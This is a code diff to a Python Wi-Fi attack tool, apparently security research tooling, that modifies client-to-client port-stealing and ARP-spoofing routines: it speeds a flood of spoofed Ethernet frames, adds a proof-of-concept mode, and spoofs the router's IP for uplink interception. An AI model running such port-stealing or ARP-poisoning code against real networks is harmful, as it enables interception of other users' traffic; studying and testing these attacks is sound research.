@@ -852,8 +852,10 @@ class Client2Client:
 			p = Ether(src=self.sup_attacker.mac, dst=self.sup_attacker.mac, type=0x0800)/Raw(b"port_steal")
 			log(STATUS, f"Sending port stealing frames from attacker (gateway MAC address) to himself:       {repr(p)} (Ethernet destination is the attacker's addr)")
 			for _ in range(1000000):
-				self.sup_attacker.send_eth(p)
-				time.sleep(0.1)
+				if self.attacker_connected:
+					self.sup_attacker.send_eth(p)
+					#log(STATUS, f"Sent one port stealing frame from attacker:       {repr(p)}")
+				time.sleep(0.001)
 			log(STATUS, f"Finished sending 1000000 uplink stealing frames.")
 
 		elif self.options.c2c_broadcast is not None:
@@ -957,7 +959,8 @@ class Client2Client:
 			self.sup_victim.get_ip_address()
 
 		if self.options.c2c_port_steal_uplink is not None:
-			set_macaddress(self.options.c2c, self.sup_victim.routermac)
+			if self.options.poc is not True:
+				set_macaddress(self.options.c2c, self.sup_victim.routermac)
 			self.sup_attacker = Supplicant(self.options.c2c, self.options)
 
 		self.attacker_connect()
@@ -1047,8 +1050,11 @@ class Client2Client:
                 # Let the attacker get an IP address, also
                 if self.options.c2c_port_steal_uplink is None and self.options.c2c_port_steal is None:
                         self.sup_attacker.get_ip_address()
-                elif self.options.c2c_port_steal is not None: 
+                elif self.options.c2c_port_steal is not None and self.options.poc is not True: 
                         self.sup_attacker.arp_sock = ARP_sock(sock=self.sup_attacker.sock_eth, IP_addr=self.sup_victim.clientip, ARP_addr=self.sup_attacker.mac)
+                        self.sup_attacker.can_send_traffic = True
+                elif self.options.c2c_port_steal_uplink is not None and self.options.poc is not True: 
+                        self.sup_attacker.arp_sock = ARP_sock(sock=self.sup_attacker.sock_eth, IP_addr=self.sup_victim.routerip, ARP_addr=self.sup_attacker.mac)
                         self.sup_attacker.can_send_traffic = True
                 self.attacker_connected = True
 
@@ -1202,6 +1208,7 @@ def main():
 
 if __name__ == "__main__":
 	main()
+
 
 
 
